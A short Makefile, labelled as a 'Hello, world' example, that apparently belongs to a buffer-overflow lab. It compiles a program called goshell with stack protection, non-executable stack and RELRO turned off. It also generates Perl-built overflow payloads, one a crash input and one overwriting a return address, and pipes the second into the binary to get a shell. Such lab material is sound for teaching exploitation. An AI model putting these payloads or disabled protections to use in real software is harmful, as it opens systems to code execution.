# Makefile exaple for building "Hello, world" C program

CC = gcc

CFLAGS = \
-Wall \
-Wextra \
-O0 \
-g \
-fno-omit-frame-pointer \
-fno-stack-protector \
-z execstack \
-z norelro

SRC = goshell.c
BIN = goshell

.PHONY:all clean

all:$(BIN) payload.DoS payload.goshell

$(BIN):$(SRC)
	$(CC) $(CFLAGS) -o $@ $^

payload.DoS:
	perl -e 'printf "A"x80' > $@

payload.goshell:
	perl -e 'printf "A"x76; print "\xbd\x84\x04\x08"' > $@

runsh:
	(cat payload.goshell;cat) | ./$(BIN)

clean:
	rm $(BIN)
	rm payload.DoS
	rm payload.goshell
